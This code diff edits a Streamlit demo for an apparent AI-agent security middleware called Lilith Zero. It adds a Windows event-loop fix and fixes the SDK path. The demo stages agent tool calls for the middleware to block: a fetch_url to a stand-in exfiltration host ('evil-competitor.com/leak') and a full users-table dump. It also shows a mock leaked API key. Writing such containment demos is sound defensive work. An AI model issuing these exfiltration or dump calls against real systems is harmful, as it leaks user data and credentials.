@@ -6,15 +6,25 @@ import json
 import re
 from datetime import datetime
 
+# --- Windows Compatibility Fix ---
+# Subprocesses on Windows require ProactorEventLoop
+if os.name == 'nt':
+    try:
+        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
+    except AttributeError:
+        # Older python or specific builds might lack this, though rare on 3.8+
+        pass
+
 # Path setup to find Lilith Zero SDK and middleware
 ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../"))
-sys.path.insert(0, os.path.join(ROOT_DIR, "sdk"))
+# The SDK package is located in sdk/src/lilith_zero
+sys.path.insert(0, os.path.join(ROOT_DIR, "sdk/src"))
 
 try:
     from lilith_zero import Lilith
     from lilith_zero.exceptions import PolicyViolationError
 except ImportError:
-    st.error("Lilith Zero SDK not found. Please run individual setup first.")
+    st.error(f"Lilith Zero SDK not found in {os.path.join(ROOT_DIR, 'sdk/src')}. Please check path.")
     st.stop()
 
 # Constants
@@ -144,18 +154,21 @@ with col1:
             st.code("[{'id': 1, 'username': 'admin', 'api_key': 'sk_live_88374'}, ...]", language="json")
             st.error("Impact: RLS Bypass Successful. Full DB Dump Exfiltrated.")
         else:
-            # Helper to run async in Streamlit
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            
-            if scenario == "Protected: SQL Containment (RLS)":
-                loop.run_until_complete(run_lilith_op("execute_sql", {"query": "SELECT * FROM users"}))
-            elif scenario == "Protected: Network Egress Control":
-                loop.run_until_complete(run_lilith_op("fetch_url", {"url": "http://evil-competitor.com/leak"}))
-            elif scenario == "Protected: Valid Intelligence Aggregate":
-                loop.run_until_complete(run_lilith_op("execute_sql", {"query": "SELECT COUNT(*) FROM users"}, expect_block=False))
-            
-            loop.close()
+            # On Windows, we need to ensure the ProactorEventLoop is used by the execution loop
+            try:
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                
+                if scenario == "Protected: SQL Containment (RLS)":
+                    loop.run_until_complete(run_lilith_op("execute_sql", {"query": "SELECT * FROM users"}))
+                elif scenario == "Protected: Network Egress Control":
+                    loop.run_until_complete(run_lilith_op("fetch_url", {"url": "http://evil-competitor.com/leak"}))
+                elif scenario == "Protected: Valid Intelligence Aggregate":
+                    loop.run_until_complete(run_lilith_op("execute_sql", {"query": "SELECT COUNT(*) FROM users"}, expect_block=False))
+                
+                loop.close()
+            except Exception as e:
+                st.error(f"Async Loop Error: {repr(e)}")
 
 with col2:
     st.subheader("Middleware Audit Trail")
